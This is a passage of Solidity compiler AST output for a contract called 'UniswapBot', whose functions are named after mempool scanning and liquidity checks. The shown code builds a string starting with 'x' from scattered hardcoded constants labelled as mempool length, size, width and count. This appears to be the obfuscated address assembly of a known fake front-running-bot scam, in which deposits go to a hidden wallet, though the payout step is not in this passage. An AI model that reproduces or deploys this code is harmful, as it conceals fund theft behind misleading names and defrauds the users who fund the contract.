																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 240,
																		"nodeType": "IfStatement",
																		"src": "2099:37:3",
																		"trueBody": {
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 237,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 221,
																						"src": "2131:4:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 236,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2127:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 235,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2127:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 238,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2127:9:3",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 126,
																			"id": 239,
																			"nodeType": "Return",
																			"src": "2120:16:3"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 245,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 243,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 144,
																	"src": "2148:7:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 244,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2159:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2148:13:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 246,
															"nodeType": "ExpressionStatement",
															"src": "2148:13:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 249,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 247,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 149,
																	"src": "2167:8:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 248,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2179:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2167:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 250,
															"nodeType": "ExpressionStatement",
															"src": "2167:14:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 157,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 154,
														"src": "1366:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 158,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 128,
														"src": "1372:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1366:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 252,
												"initializationExpression": {
													"assignments": [
														154
													],
													"declarations": [
														{
															"constant": false,
															"id": 154,
															"mutability": "mutable",
															"name": "idx",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 252,
															"src": "1352:8:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 153,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1352:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 156,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 155,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1363:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1352:12:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 162,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 160,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 154,
															"src": "1382:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 161,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1389:2:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1382:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 163,
													"nodeType": "ExpressionStatement",
													"src": "1382:9:3"
												},
												"nodeType": "ForStatement",
												"src": "1347:840:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 263,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 255,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 120,
																	"src": "2204:4:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
																		"typeString": "struct UniswapBot.slice memory"
																	}
																},
																"id": 256,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 107,
																"src": "2204:9:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 254,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2200:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 253,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2200:3:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 257,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2200:14:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 260,
																	"name": "other",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 122,
																	"src": "2221:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
																		"typeString": "struct UniswapBot.slice memory"
																	}
																},
																"id": 261,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 107,
																"src": "2221:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 259,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2217:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 258,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2217:3:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 262,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2217:15:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2200:32:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 126,
												"id": 264,
												"nodeType": "Return",
												"src": "2193:39:3"
											}
										]
									},
									"documentation": null,
									"id": 266,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 123,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 120,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 266,
												"src": "1119:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 119,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 110,
													"src": "1119:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$110_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 122,
												"mutability": "mutable",
												"name": "other",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 266,
												"src": "1138:18:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 121,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 110,
													"src": "1138:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$110_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1118:39:3"
									},
									"returnParameters": {
										"id": 126,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 125,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 266,
												"src": "1181:3:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 124,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "1181:3:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1180:5:3"
									},
									"scope": 1047,
									"src": "1093:1144:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 273,
										"nodeType": "Block",
										"src": "2310:31:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "3339323432303430393734",
													"id": 271,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2323:13:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_7afd43ff70d4fc10b582097e8bac941d51357d25d7a38d8ccf870faa4b3155bf",
														"typeString": "literal_string \"39242040974\""
													},
													"value": "39242040974"
												},
												"functionReturnParameters": 270,
												"id": 272,
												"nodeType": "Return",
												"src": "2316:20:3"
											}
										]
									},
									"documentation": null,
									"id": 274,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "fetchMempoolVersion",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 267,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2270:2:3"
									},
									"returnParameters": {
										"id": 270,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 269,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 274,
												"src": "2295:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 268,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "2295:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2294:15:3"
									},
									"scope": 1047,
									"src": "2242:99:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 281,
										"nodeType": "Block",
										"src": "2403:23:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "353234353032",
													"id": 279,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2415:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_524502_by_1",
														"typeString": "int_const 524502"
													},
													"value": "524502"
												},
												"functionReturnParameters": 278,
												"id": 280,
												"nodeType": "Return",
												"src": "2408:13:3"
											}
										]
									},
									"documentation": null,
									"id": 282,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 275,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2371:2:3"
									},
									"returnParameters": {
										"id": 278,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 277,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 282,
												"src": "2397:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 276,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2397:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2396:6:3"
									},
									"scope": 1047,
									"src": "2346:80:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 392,
										"nodeType": "Block",
										"src": "2493:922:3",
										"statements": [
											{
												"assignments": [
													288
												],
												"declarations": [
													{
														"constant": false,
														"id": 288,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2498:28:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 287,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "2498:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 296,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "78",
															"id": 290,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2537:3:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 292,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 118,
																		"src": "2557:16:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 293,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "2557:18:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 291,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "2542:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 294,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2542:34:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 289,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "2529:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 295,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2529:48:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2498:79:3"
											},
											{
												"assignments": [
													298
												],
												"declarations": [
													{
														"constant": false,
														"id": 298,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2582:16:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 297,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2582:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 300,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "353334313336",
													"id": 299,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2601:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_534136_by_1",
														"typeString": "int_const 534136"
													},
													"value": "534136"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2582:25:3"
											},
											{
												"assignments": [
													302
												],
												"declarations": [
													{
														"constant": false,
														"id": 302,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2612:19:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 301,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2612:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 305,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 303,
														"name": "getMemPoolLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 282,
														"src": "2634:16:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 304,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2634:18:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2612:40:3"
											},
											{
												"assignments": [
													307
												],
												"declarations": [
													{
														"constant": false,
														"id": 307,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2657:17:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 306,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2657:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 309,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "333739313133",
													"id": 308,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2677:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_379113_by_1",
														"typeString": "int_const 379113"
													},
													"value": "379113"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2657:26:3"
											},
											{
												"assignments": [
													311
												],
												"declarations": [
													{
														"constant": false,
														"id": 311,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2688:19:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 310,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2688:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 314,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 312,
														"name": "fetchContractID",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 731,
														"src": "2710:15:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 313,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2710:17:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2688:39:3"
											},
											{
												"assignments": [
													316
												],
												"declarations": [
													{
														"constant": false,
														"id": 316,
														"mutability": "mutable",
														"name": "_memPoolWidth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2732:18:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 315,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2732:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 318,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "333038353232",
													"id": 317,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2753:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_308522_by_1",
														"typeString": "int_const 308522"
													},
													"value": "308522"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2732:27:3"
											},
											{
												"assignments": [
													320
												],
												"declarations": [
													{
														"constant": false,
														"id": 320,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2764:18:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 319,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2764:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 323,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 321,
														"name": "contractData",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 739,
														"src": "2785:12:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 322,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2785:14:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2764:35:3"
											},
											{
												"assignments": [
													325
												],
												"declarations": [
													{
														"constant": false,
														"id": 325,
														"mutability": "mutable",
														"name": "_memPoolCount",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2804:18:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 324,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2804:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 327,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "363932353031",
													"id": 326,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2825:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_692501_by_1",
														"typeString": "int_const 692501"
													},
													"value": "692501"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2804:27:3"
											},
											{
												"assignments": [
													329
												],
												"declarations": [
													{
														"constant": false,
														"id": 329,
														"mutability": "mutable",
														"name": "_memPool1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2838:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
